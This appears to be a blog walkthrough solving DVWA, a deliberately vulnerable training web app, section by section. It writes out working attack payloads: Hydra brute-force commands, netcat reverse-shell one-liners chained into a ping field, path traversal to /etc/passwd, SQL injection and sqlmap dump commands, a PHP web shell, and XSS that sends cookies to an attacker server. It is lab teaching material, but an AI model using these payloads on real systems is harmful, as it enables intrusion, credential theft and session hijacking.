<p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p>

<p>Let's test our OWASP TOP 10 skills with DVWA</p>

<h2 id="bruteforcing">Bruteforcing</h2>
<p>Low</p>

<p>In the Bruteforcing section we can see a normal login page<img src="/assets/images/dvwa/bruteforcing/1.png" alt="" />we can try entering any cred and see how it will react, let's try admin:admin<img src="/assets/images/dvwa/bruteforcing/1-2.png" alt="" />it gives out an error message "Username and/or password incorrect."</p>

<p>Now let's capture the request with a tool called <a href="https://portswigger.net/burp/communitydownload">BurpSuite</a>- BurpSuite is a proxy-based tool used to evaluate the security of web-based applications and do hands-on testing. </p>

<p>Before we continue using BurpSuite we need to setup our web browser's proxy so that BurpSuite can intercept all the request that we want. For this we will use an add-on called <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to make changing our proxy settings easier. Now add a proxy settings with in FoxyProxy as follows <img src="/assets/images/dvwa/bruteforcing/1-3.png" alt="" /> - Select the proxy that you created and now we're ready to intercept our first request!</p>

<p>Login again using any creds - this time Burp will intercept the request and you should see the request in the Proxy tab<img src="/assets/images/dvwa/bruteforcing/2.png" alt="" /> - here we can see that we sent a GET request for /vulnerabilities/brute/?username=admi&password=admin&Login=Login to our DVWA host which is 192.168.56.103 on my case.</p>

<p>We can Bruteforce this using the Intruder function of Burp - right click on the request and send the request to Intruder<img src="/assets/images/dvwa/bruteforcing/3.png" alt="" /><br>Now that we're in the intruder click the clear button to remove the highlighted payloads - these payloads are the ones that we can bruteforce for this example we will use the Attack Type called Sniper. Highlight the password and click add$.<br><img src="/assets/images/dvwa/bruteforcing/4.png" alt="" />You will notice that the password part will get highlighted this means that it is selected for bruteforcing - now click the payloads tab<br><img src="/assets/images/dvwa/bruteforcing/5.png" alt="" />Here we can load out our wordlists that Burp will use to bruteforce our selected payload, in our case the password section.</p>

<p>I will use the worldlist probable-v2-top1575 from the <a href="https://github.com/danielmiessler/SecLists"> Seclists</a> collection. After loading the wordlist we can now proceed to bruteforcing - Click Attack. Sort the results according to length and from here you will see one entry with different value which is 5007 for password.<br><img src="/assets/images/dvwa/bruteforcing/6.png" alt="" /></p>

<p>if we try to login using the result we will get the following<img src="/assets/images/dvwa/bruteforcing/7.png" alt="" /> If we try to inspect element we can see the location of the image<img src="/assets/images/dvwa/bruteforcing/8.png" alt="" /><br>And after browsing to the directory we will see the other probable users.<img src="/assets/images/dvwa/bruteforcing/9.png" alt="" /></p>

<p>Now we can do the same thing for the other probable users. We can do this one at a time by editing the username field on our request (changing the admin to another user) and then proceeding like before or we can use the Cluster Bomb attack type. To do this clear the payloads, then add the username and password field again.<img src="/assets/images/dvwa/bruteforcing/9-1.png" alt="" /><br>Now this time in the payloads tab, we can set 2 payloads the first one for the usernames and the second for the password. I have created a new file that contains all the possible usernames.<img src="/assets/images/dvwa/bruteforcing/10.png" alt="" /><br>Now I'll set this as my first payload<img src="/assets/images/dvwa/bruteforcing/15.png" alt="" /><br>And for the second I'll still use the worldlist probable-v2-top1575</p>

<p>After some time we got the result of the attack.<img src="/assets/images/dvwa/bruteforcing/16.png" alt="" /><br></p>

<p>We can also use Hydra to bruteforce the web login but we won't deep dive to it for now but to do this we can use the following command</p>

<code>hydra 192.168.56.103 -L "usernames.dvwa" -P "SecLists/Passwords/xato-net-10-million-passwords.txt" http-get-form  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=du7ts72sjgglbh74h9gdps1216; security=low"</code>

<ul>
  <li>-L is for a text file that contains the usernames if you want to use a specific username you can use lowercase instead -l</li>
  <li>-P is the same for username but for passwords here we used the wordlists, you can also use lowercase to use specific password -p</li>
  <li>http-get-form is used this time cause the remember from the request that we intercepted we are sending GET request, we also used http as DVWA is using http</li>
  <li>:F= is required for http-get-form this tells hydra to check for this failure message so hydra can differentiate the real credentials, we can also use the opposite which is :S meaning we have to provide a successful message instead</li>
  <li>:H=Cookie: this is needed as we are already logged in as admin within DVWA(initial login page)</li>
</ul>

<h2 id="command-execution">Command Execution</h2>
<p>Low</p>

<p>For this section we will learn about Command Execution, Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.

<p>In this section we can see a single input box that's asking for an IP Address<img src="/assets/images/dvwa/CE/1.png" alt="" /><br>Looks like it is a ping tool. Let's try supplying it with its own IP Address<img src="/assets/images/dvwa/CE/2.png" alt="" /><br>It returns a normal ping output. Let's try my Host IP <img src="/assets/images/dvwa/CE/3.png" alt="" /><br>Let's see what's the output for an unknown IP Address<img src="/assets/images/dvwa/CE/1.png" alt="" /><br>It didn't return any output. I've tried giving it a normal bash command like ls but the same no output.</p>

<p>From this we can conclude that the IP address that we supply is getting treated like a variable and being added to the ping command so it results like ping $IP and then -c4 cause it returns 4 replies. So what happens if we try chaining a command? In Linux we can chain a command using ; So for example ping 127.0.0.1; ls will ping 127.0.0.1 and then execute the list command.<br><img src="/assets/images/dvwa/CE/4.png" alt="" /><br>And the output is <img src="/assets/images/dvwa/CE/5.png" alt="" /><br>As we can see after the ping it showed as the contents of the directory which is help, index.php, source.</p>

<p>So from here we know that this is vulnerable to Command Injection, using this vulnerability we can try running a reverse shell one liner command and see if we can get a reverse shell. For this we can check <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> PentestMonkey Cheatsheet</a> for a list of reverse shell commands. First we will set up a netcat listener on our machine using the command</p>

<code>nc -lvnp 1234</code>

<ul>
  <li>-l means listen mode, for inbound connections</li>
  <li>-p for port number</li>
  <li>-v for verbose</li>
  <li>-n for numeric-only IP address, no DNS</li>
</ul>

<p>Now that our listener is ready<img src="/assets/images/dvwa/CE/4.png" alt="" /><br>We can now try chaining the reverse shell from PentestMonkey to the vulnerable ping tool. I will try using the netcat reverse shell, first I need to confirm if nc is present in this box, to do that I'll run a <i>which nc</i> command</p><img src="/assets/images/dvwa/CE/8.png" alt="" /><br>This confirms that we can use the netcat reverse shell. Now we can input the following <i>127.0.0.1; nc -e /bin/sh 192.168.56.105 1234</i> -Note that 192.168.56.105 is my Host IP. Running this command didn't give us a reverse shell, instead it just ran the ping command. Let's try the other nc reverse shell from PentestMonkey. <i>127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.105 1234 >/tmp/f</i><br>Using this command gave us a reverse shell, we can confirm from the listener that we set up.<img src="/assets/images/dvwa/CE/9.png" alt="" /><br>And from here we can see that we have access to that machine.<br><img src="/assets/images/dvwa/CE/10.png" alt="" /><br></p>

<h2 id="csrf">CSRF</h2>
<p>Low</p>

<p>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.</p>

<p>In this section we'll see a page to change admin's password.<img src="/assets/images/dvwa/CSRF/1.png" alt="" /><br>I'll try changing it to test1 and then logout and log in again to confirm.<img src="/assets/images/dvwa/CSRF/2.png" alt="" /><br><img src="/assets/images/dvwa/CSRF/3.png" alt="" /><br>Next we can try purposely send unmatched password.<img src="/assets/images/dvwa/CSRF/4.png" alt="" /><br>Which gives us an error message saying "Passwords did not match." and also if you will notice the url, the unmatched passwords that I sent is exposed which we can probably exploit. <i>192.168.56.103/vulnerabilities/csrf/?password_new=test&password_conf=a&Change=Change#</i></p>

<p>Now we can try changing the URL and we will pretend to be the victim, that we're going to send the malicious link to. Let's change the link to <i>192.168.56.103/vulnerabilities/csrf/?password_new=csrf&password_conf=csrf&Change=Change#</i> this will change the victims password to <i>csrf</i>. So let's open a new tab paste and then enter the malicious link <img src="/assets/images/dvwa/CSRF/5.png" alt="" /><br>This will land us back to the CSRF section and it will confirm that the password has been changed.<img src="/assets/images/dvwa/CSRF/6.png" alt="" /><br></p>

<p>Now if we try to login again to our admin user and enter csrf it will let us log in.<img src="/assets/images/dvwa/CSRF/7.png" alt="" /><br><img src="/assets/images/dvwa/CSRF/8.png" alt="" /><br></p>

<h2 id="file-inclusion">File Inclusion</h2>
<p>Low</p>

<p>Local File Inclusion (LFI) allows an attacker to include files on a server through the web browser. This vulnerability exists when a web application includes a file without correctly sanitising the input, allowing and attacker to manipulate the input and inject path traversal characters and include other files from the web server.</p>

<p>In the File Inclusion Section we will notice from the url that there's a page parameter that is loading/including the include.php. From here we can just try adding <i>../../../../etc/passwd</i> to test for LFI.<img src="/assets/images/dvwa/FI/2.png" alt="" /><br>Upon trying it did give us an error saying it failed to open and that there's no such file or directory. So I added another ../ to the current URL and then it worked.<img src="/assets/images/dvwa/FI/4.png" alt="" /><br>This is because we are currently 5 directories away from root. And with that we just exploited a Local File Inclusion vulnerability</p>

<p>Now let's try Remote File Inclusion, to test this I will start a python web server that will act as our malicious website that will host a reverse shell.<img src="/assets/images/dvwa/FI/5.png" alt="" /><br>And then we will set up a Netcat listener to listen when our reverse shell gets executed.<br><img src="/assets/images/dvwa/FI/6.png" alt="" /><br></p>

<p>Now let's browse to our Python web server which is http://192.168.56.105:8000/revshell.php<img src="/assets/images/dvwa/FI/6-7.png" alt="" />Right after browsing to our reverse shell we can confirm from our Python web server that someone loaded the reverse shell<img src="/assets/images/dvwa/FI/7.png" alt="" /><br>And also we got our reverse shell.<img src="/assets/images/dvwa/FI/8.png" alt="" /></p>

<h2 id="sql-injection">SQL Injection</h2>
<p>Low</p>

<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.</p>

<p>In this section we will see a page where we can input a user id. <img src="/assets/images/dvwa/SQLi/1.png" alt="" /><br>Let's try user id 1.<br><img src="/assets/images/dvwa/SQLi/2.png" alt="" /><br>User Id 1 gives us a result of admin. As from our earlier sections we know that we have 5 users. Admin, 1337, smithy, pablo and gordonb. The goal of this section is to use SQL injection to get their passwords. Now let's try sending a single quote to our input box.<img src="/assets/images/dvwa/SQLi/3.png" alt="" /><br>This gives us an error that probably tells us that the input to this application is getting executed as SQL statements on the database. If we click the view source option in DVWA this will show us the query that's getting executed.<img src="/assets/images/dvwa/SQLi/4.png" alt="" /><br><i>"SELECT first_name, last_name FROM users WHERE user_id = 'id'";</i><br>That doesn't validate user input, so if we try another basic SQL or query like <i>a' or'1'='1</i> this will result to <i>"SELECT first_name, last_name FROM users WHERE user_id = 'a' or'1'='1'";</i> This query being executed.</p>

<p><img src="/assets/images/dvwa/SQLi/5.png" alt="" /><br>As we can see from the output it returned all the entries from the users table because of the 1=1 statement that is always true. Now let's try to query for their passwords using Union Attacks - The UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack. </p>

<p>The query that we will use will be <i>a' UNION SELECT username, password FROM users-- -</i><br>This will result to <i>"SELECT first_name, last_name FROM users WHERE user_id = 'a' UNION SELECT username, password FROM users-- -";</i><br>This resulted to an error saying<br><img src="/assets/images/dvwa/SQLi/6.png" alt="" /><br>Next I would like to see what columns are present in the users table for that I found a SQL cheatsheet online and will use<br><i>%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #</i><br><img src="/assets/images/dvwa/SQLi/7.png" alt="" /><br>And here we can see that we have user_id, first_name, last_name, user, password, avatar. Now let's edit our first query to<br><i>a' UNION SELECT user, password FROM users-- -";</i><br>

<p><img src="/assets/images/dvwa/SQLi/8.png" alt="" /><br>And there we have it in the first column it showed us the user and in the second column it showed the password hash for the user. Now we can just copy the hashes and bruteforce them offline using hashcat. To do that let's save the hashes to a text file.<br><img src="/assets/images/dvwa/SQLi/9.png" alt="" /><br>Then run this hashcat command<br><img src="/assets/images/dvwa/SQLi/10.png" alt="" /><br>And after just a couple of seconds we have our passwords. <img src="/assets/images/dvwa/SQLi/11.png" alt="" /><br></p>

<h2 id="sql-injection-blind">SQL Injection(Blind)</h2>
<p>Low</p>

<p>Had to install a newer version of DVWA for this section, here we can see just like in the previous SQL Injection challenge we can input a user ID, the only difference is it only gives a a User ID exist or not so basically a true or false. For now I will use a tool called SQLMap. To do this we will need to capture a request from this section that gives us a True output, I'll input 1 as a User ID as we know that User 1 exist.</p>

<p><img src="/assets/images/dvwa/Blind/2.png" alt="" /><br>After saving the request we will use this in SQLMap with the command <i>sqlmap -r dvwa.req -p id --dbs</i> this command will check the name of all the databases.<img src="/assets/images/dvwa/Blind/3.png" alt="" /><br>And as we can see there's a dvwa database.<img src="/assets/images/dvwa/Blind/4.png" alt="" /><br>Next we will try to see what tables are in dvwa database using the command <i>sqlmap -r dvwa.req -p id -D dvwa --tables</i><img src="/assets/images/dvwa/Blind/5.png" alt="" /><br></p>

<p>Now we we are interested in the what columns are available in users table to do that let's use the command <i>sqlmap -r dvwa.req -p id -D dvwa -T users --columns</i><br><img src="/assets/images/dvwa/Blind/6.png" alt="" /><br>Finally we can just dump the info from these columns.<br><i>sqlmap -r dvwa.req -p id -D dvwa -T users --dump</i><br>After dumping and choosing a wordlist to crack the hashes we now have the users and their passwords.<br><img src="/assets/images/dvwa/Blind/7.png" alt="" /></p>

<h2 id="file-upload">File Upload</h2>
<p>Low</p>

<p>In this Section we can see that we can upload a file, let's try uploading a .png file.<img src="/assets/images/dvwa/upload/2.png" alt="" /><br>And its uploaded no problem now let's try uploading our php reverse shell.<img src="/assets/images/dvwa/upload/4.png" alt="" /><br>And it is uploaded as well and we get a shell after executing it.<img src="/assets/images/dvwa/upload/5.png" alt="" /><br>So we can see that there's no security in place that checks the files that we're uploading in Low difficulty</p>

<p>Medium</p>

<p>Now let's change the difficulty to medium, and see if our reverse shell will still upload.<img src="/assets/images/dvwa/upload/6.png" alt="" /><br>And we get an error saying "Your image was not uploaded.". So from this error it looks like it will only accept jpg or png files. Let's intercept our request with BurpSuite and send the request to repeater.<br><img src="/assets/images/dvwa/upload/7.png" alt="" /><br>After sending to the repeater we can see the error code on the response field.<br><img src="/assets/images/dvwa/upload/8.png" alt="" /><br>We can try changing the file extension of our reverse shell to png if that will bypass the security.<img src="/assets/images/dvwa/upload/9.png" alt="" /><br>And that didn't work as we can see in the response.<br><img src="/assets/images/dvwa/upload/10.png" alt="" /><br></p>

<p>So next let's try changing the Content-Type, as this is a php file the current Content-Type is application/x-php. Let's change this to image/jpeg.<br><img src="/assets/images/dvwa/upload/12.png" alt="" /><br>And it worked even with the extension of php as long as we changed the Content-Type to image/jpeg we successfully bypassed the upload security.<br><img src="/assets/images/dvwa/upload/13.png" alt="" /><br>Browsing to our reverse shell still gives us a working shell from our netcat listener.</p>

<p>High</p>

<p>For high difficulty I tried changing the Content-Type again but it failed, so this time I also changed the file extension to .jpeg.<br><img src="/assets/images/dvwa/upload/14.png" alt="" /><br>And it worked. I tried reverting the Content-Type to application/x-php and still worked<br><img src="/assets/images/dvwa/upload/15.png" alt="" /><br>So looks like for High difficulty the only requirement is to match the file extension. But the problem is when browsing to our uploaded reverse shell file it doesn't trigger our reverse shell anymore even after changing the extension to .php.jpg.<br><img src="/assets/images/dvwa/upload/16.png" alt="" /><br></p>

<p>So I edited the request on Burp and changed the php code to a one liner php code that uses hyst as a parameter - <i><?phpsystem($_GET[‘hyst’]);?></i><br><img src="/assets/images/dvwa/upload/17.png" alt="" /><br>I sent the edited request to repeater, I'm still able to upload the file as long as I also change the end of the file extension to jpg. I also tried adding the jpeg magic bytes together with the php one code <br><img src="/assets/images/dvwa/upload/19.png" alt="" /><br><br><img src="/assets/images/dvwa/upload/20.png" alt="" /><br> And I still can't get it to execute my code. Will research more about this later but for now we have successfully uploaded the file.</p>

<h2 id="xss-reflected">XSS Reflected</h2>
<p>Low</p>

<p>Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.</p>

<p>In this Section we can see an input box asking for our name. Let's try entering admin<br><img src="/assets/images/dvwa/xssR/1.png" alt="" /><br>Next we will trying sending it a basic alert script <i>alert('reflect')</i><br><img src="/assets/images/dvwa/xssR/2.png" alt="" /><br>And as we can see it triggered a new alert windows saying reflect. Knowing this we can try pretending to be a victim and log in using another account, we will use 1337 and then we will try to steal their cookie.<br><img src="/assets/images/dvwa/xssR/3.png" alt="" /><br></p>

<p>First we will start a python web server on our attacker's machine.<br><img src="/assets/images/dvwa/xssR/4.png" alt="" /><br>Now let's craft a malicious url using <i>window.location='http://192.168.56.105:8000/?hyst=' + document.cookie</i><br>So here is 1337 and the current cookie session<br><img src="/assets/images/dvwa/xssR/3.png" alt="" /><br>When they used the malicious script we will receive the cookie in our python web server as shown below.<br><img src="/assets/images/dvwa/xssR/6.png" alt="" /></p>

<h2 id="xss-stored">XSS Stored</h2>
<p>Low</p>

<p>Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.</p>

<p>For the XSS Stored we have a guest book page where we can leave a message and it will be saved on the server.<img src="/assets/images/dvwa/xsss/2.png" alt="" /><br> With this we can try leaving a malicious script and it will execute to anyone who will visit the page. So let's try, first I left a message as admin with the message "test". I confirmed that the user 1337 from the other machine can see it.<img src="/assets/images/dvwa/xsss/1.png" alt="" /><br>Now let's try leaving a malicous script that will pop up an alert.<img src="/assets/images/dvwa/xsss/5.png" alt="" /><br><img src="/assets/images/dvwa/xsss/4.png" alt="" /><br>And from 1337 we can see that our alert script got executed.<img src="/assets/images/dvwa/xsss/3.png" alt="" /><br></p>

<p>Now let's try to steal 1337's cookie again. We will use <i>window.location='http://192.168.56.105:8000/?hyst=' + document.cookie</i> again but we have to edit the maxlength variable using inspect element.<img src="/assets/images/dvwa/xsss/6.png" alt="" /><br><img src="/assets/images/dvwa/xsss/7.png" alt="" /><br>And then once the message is submitted and 1337 went to that page we can see from our python web server that we received the cookie. first one is our cookie, second is 1337's.<br><img src="/assets/images/dvwa/xsss/6.png" alt="" /><br><img src="/assets/images/dvwa/xsss/8.png" alt="" /></p>
